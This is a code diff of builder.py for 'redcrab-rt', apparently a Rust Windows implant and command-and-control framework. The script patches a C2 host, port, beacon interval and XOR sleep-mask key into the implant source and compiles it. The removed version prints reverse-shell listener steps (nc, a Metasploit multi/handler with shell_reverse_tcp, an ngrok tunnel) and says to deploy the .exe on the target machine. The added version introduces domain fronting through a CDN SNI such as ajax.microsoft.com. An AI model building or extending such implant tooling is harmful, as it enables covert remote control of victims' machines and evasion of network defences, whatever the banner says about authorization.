@@ -1,157 +1,103 @@
 #!/usr/bin/env python3
+"""builder.py — patch C2 config into source files, then compile.
+
+Prompts:
+  ngrok/C2 host     (real C2 domain — goes into Host header)
+  front domain      (CDN SNI for domain fronting, e.g. ajax.microsoft.com)
+  C2 port           (default 443)
+  beacon interval   (ms, default 15000)
+  SLEEP_KEY         (16-byte hex or blank → random)
+
+Patches src/c2.rs and src/main.rs, then runs cargo build --release.
 """
-redcrab-rt builder
-==================
-Patches C2 connection details into the Rust source, then compiles the implant.
+import os, sys, re, struct, random, subprocess
 
-Usage:
-  python builder.py
+def rand_key() -> list:
+    return [random.randint(0, 255) for _ in range(16)]
 
-You will be prompted for:
-  ngrok_host  — the public TCP host ngrok gave you   (e.g. 0.tcp.ngrok.io)
-  ngrok_port  — the public TCP port ngrok gave you   (e.g. 12345)
-  lport       — your LOCAL listener port             (e.g. 4444)
-  sleep_key   — 16 hex bytes for XOR / sleep mask    (leave blank = random)
+def hex_to_bytes(s: str) -> list:
+    s = s.replace(' ', '').replace('0x', '').replace(',', '')
+    if len(s) != 32:
+        raise ValueError("SLEEP_KEY must be exactly 16 bytes (32 hex chars)")
+    return [int(s[i:i+2], 16) for i in range(0, 32, 2)]
 
-The script:
-  1. Patches src/c2.rs and src/main.rs with your values
-  2. Runs cargo build --release
-  3. Prints the path to the compiled .exe
-"""
+def bytes_to_rust_array(b: list) -> str:
+    return ', '.join(f'0x{x:02x}' for x in b)
 
-import os
-import re
-import sys
-import random
-import subprocess
-from pathlib import Path
-
-SRC_DIR   = Path(__file__).parent / "src"
-C2_RS     = SRC_DIR / "c2.rs"
-MAIN_RS   = SRC_DIR / "main.rs"
-TARGET    = Path(__file__).parent / "target" / "x86_64-pc-windows-msvc" / "release" / "redcrab-rt.exe"
-
-def banner():
-    print()
-    print("  ██████╗ ███████╗██████╗  ██████╗██████╗  █████╗ ██████╗     ██████╗ ████████╗")
-    print(" ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗╚══██╔══╝")
-    print(" ██████╔╝█████╗  ██║  ██║██║     ██████╔╝███████║██████╔╝    ██████╔╝   ██║   ")
-    print(" ██╔══██╗██╔══╝  ██║  ██║██║     ██╔══██╗██╔══██║██╔══██╗    ██╔══██╗   ██║   ")
-    print(" ██║  ██║███████╗██████╔╝╚██████╗██║  ██║██║  ██║██████╔╝    ██║  ██║   ██║   ")
-    print(" ╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝   ╚═╝   ")
-    print("                        authorized red team framework")
-    print()
-
-def prompt(msg, default=None):
-    if default:
-        val = input(f"  {msg} [{default}]: ").strip()
-        return val if val else default
-    val = input(f"  {msg}: ").strip()
-    return val
-
-def random_sleep_key():
-    return bytes(random.randint(0, 255) for _ in range(16))
-
-def sleep_key_from_input(s):
-    """Accept comma-sep hex bytes or blank (= random)."""
-    if not s:
-        return random_sleep_key()
-    parts = [p.strip() for p in s.replace('0x','').split(',')]
-    try:
-        b = bytes(int(p, 16) for p in parts if p)
-        if len(b) != 16:
-            raise ValueError
-        return b
-    except ValueError:
-        print("  [!] Invalid key format — generating random key")
-        return random_sleep_key()
-
-def patch_c2_rs(host, port, key_bytes):
-    text = C2_RS.read_text()
-    # Patch host
-    text = re.sub(
-        r'pub const C2_HOST: &str = ".*?";',
-        f'pub const C2_HOST: &str = "{host}";',
-        text
-    )
-    # Patch port
-    text = re.sub(
-        r'pub const C2_PORT: u16\s+=\s+\d+;',
-        f'pub const C2_PORT: u16   = {port};',
-        text
-    )
-    # Patch XOR key (as a byte-literal string from the hex bytes)
-    key_literal = ''.join(f'\\x{b:02x}' for b in key_bytes)
-    text = re.sub(
-        r'const XOR_KEY: &\[u8\] = b".*?";',
-        f'const XOR_KEY: &[u8] = b"{key_literal}";',
-        text
-    )
-    C2_RS.write_text(text)
-    print(f"  [+] c2.rs patched  →  {host}:{port}")
-
-def patch_main_rs(key_bytes):
-    text = MAIN_RS.read_text()
-    key_array = ', '.join(f'0x{b:02x}' for b in key_bytes)
-    text = re.sub(
-        r'const SLEEP_KEY: \[u8; 16\] = \[[^\]]*\];',
-        f'const SLEEP_KEY: [u8; 16] = [{key_array}];',
-        text,
-        flags=re.DOTALL
-    )
-    MAIN_RS.write_text(text)
-    print(f"  [+] main.rs SLEEP_KEY patched")
-
-def compile_implant():
-    print("  [*] Running cargo build --release ...")
-    result = subprocess.run(
-        ["cargo", "build", "--release", "--target", "x86_64-pc-windows-msvc"],
-        cwd=Path(__file__).parent,
-        capture_output=False
-    )
-    if result.returncode != 0:
-        print("  [!] Build failed — check cargo output above")
-        sys.exit(1)
-    print(f"  [+] Build succeeded!")
-    if TARGET.exists():
-        size_kb = TARGET.stat().st_size // 1024
-        print(f"  [+] Output: {TARGET}  ({size_kb} KB)")
-    else:
-        print(f"  [?] Binary not found at expected path — check target/ directory")
-
-def ngrok_instructions(lport):
-    print()
-    print("  ─── ngrok setup ─────────────────────────────────────────────")
-    print(f"  1. Start your listener:  nc -lvnp {lport}")
-    print(f"     (or: msfconsole -x 'use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp;")
-    print(f"      set LHOST 0.0.0.0; set LPORT {lport}; run')")
-    print(f"  2. Start ngrok tunnel:   ngrok tcp {lport}")
-    print(f"  3. Copy the public address from ngrok output:")
-    print(f"     e.g.  tcp://0.tcp.ngrok.io:XXXXX")
-    print(f"  4. Re-run builder.py and enter those values")
-    print(f"  5. Deploy the compiled .exe on the target machine")
-    print("  ──────────────────────────────────────────────────────────────")
-    print()
+def patch_file(path: str, replacements: dict):
+    with open(path, 'r', encoding='utf-8') as f:
+        content = f.read()
+    for placeholder, value in replacements.items():
+        if placeholder not in content:
+            print(f'[warn] placeholder not found in {path}: {placeholder}')
+        content = content.replace(placeholder, value)
+    with open(path, 'w', encoding='utf-8') as f:
+        f.write(content)
+    print(f'[+] patched {path}')
 
 def main():
-    banner()
-    print("  === redcrab-rt implant builder ===")
-    print()
+    print('=== redcrab-rt builder ===')
+    c2_host    = input('C2 real domain (Host header) [e.g. c2.yourdomain.com]: ').strip()
+    front      = input('Front domain SNI [e.g. ajax.microsoft.com, blank=no fronting]: ').strip()
+    port_str   = input('C2 port [443]: ').strip() or '443'
+    beacon_str = input('Beacon interval ms [15000]: ').strip() or '15000'
+    key_str    = input('SLEEP_KEY hex (32 chars, blank=random): ').strip()
 
-    ngrok_host = prompt("ngrok host (e.g. 0.tcp.ngrok.io)")
-    ngrok_port = int(prompt("ngrok port (e.g. 12345)"))
-    lport      = int(prompt("local listener port (e.g. 4444)", default="4444"))
-    key_input  = prompt("SLEEP_KEY 16 hex bytes comma-sep (blank = random)")
-    key_bytes  = sleep_key_from_input(key_input)
+    if not c2_host:
+        print('[!] C2 host required'); sys.exit(1)
+    if not front:
+        front = c2_host  # no domain fronting — direct TLS
 
-    print()
-    print(f"  [*] SLEEP_KEY = {' '.join(f'{b:02x}' for b in key_bytes)}")
-    print()
+    port    = int(port_str)
+    beacon  = int(beacon_str)
+    key_bytes = hex_to_bytes(key_str) if key_str else rand_key()
 
-    patch_c2_rs(ngrok_host, ngrok_port, key_bytes)
-    patch_main_rs(key_bytes)
-    compile_implant()
-    ngrok_instructions(lport)
+    print(f'[*] C2 host      : {c2_host}')
+    print(f'[*] Front domain : {front}')
+    print(f'[*] Port         : {port}')
+    print(f'[*] Beacon       : {beacon} ms')
+    print(f'[*] SLEEP_KEY    : {bytes_to_rust_array(key_bytes)}')
 
-if __name__ == "__main__":
+    # Patch c2.rs
+    patch_file('src/c2.rs', {
+        'NGROK_HOST_PLACEHOLDER':  c2_host,
+        'FRONT_DOMAIN_PLACEHOLDER': front,
+        'pub const C2_PORT: u16          = 443;':
+            f'pub const C2_PORT: u16          = {port};',
+        'pub const BEACON_INTERVAL_MS: u64 = 15_000;':
+            f'pub const BEACON_INTERVAL_MS: u64 = {beacon};',
+    })
+
+    # Patch main.rs SLEEP_KEY
+    main_path = 'src/main.rs'
+    with open(main_path, 'r', encoding='utf-8') as f:
+        main_src = f.read()
+    key_pattern = re.compile(
+        r'pub const SLEEP_KEY: \[u8; 16\] = \[\s*[\s\S]*?\];',
+        re.MULTILINE
+    )
+    new_key = (
+        f'pub const SLEEP_KEY: [u8; 16] = [\n    {bytes_to_rust_array(key_bytes[:8])},\n'
+        f'    {bytes_to_rust_array(key_bytes[8:])},\n];'
+    )
+    main_src, n = key_pattern.subn(new_key, main_src)
+    if n == 0:
+        print('[warn] SLEEP_KEY pattern not found in main.rs')
+    with open(main_path, 'w', encoding='utf-8') as f:
+        f.write(main_src)
+    print(f'[+] patched src/main.rs')
+
+    # Build
+    print('[*] building...')
+    result = subprocess.run(
+        ['cargo', 'build', '--release', '--target', 'x86_64-pc-windows-msvc'],
+        capture_output=False
+    )
+    if result.returncode == 0:
+        print('[+] build ok → target/x86_64-pc-windows-msvc/release/redcrab-rt.exe')
+    else:
+        print('[!] build failed')
+        sys.exit(result.returncode)
+
+if __name__ == '__main__':
     main()
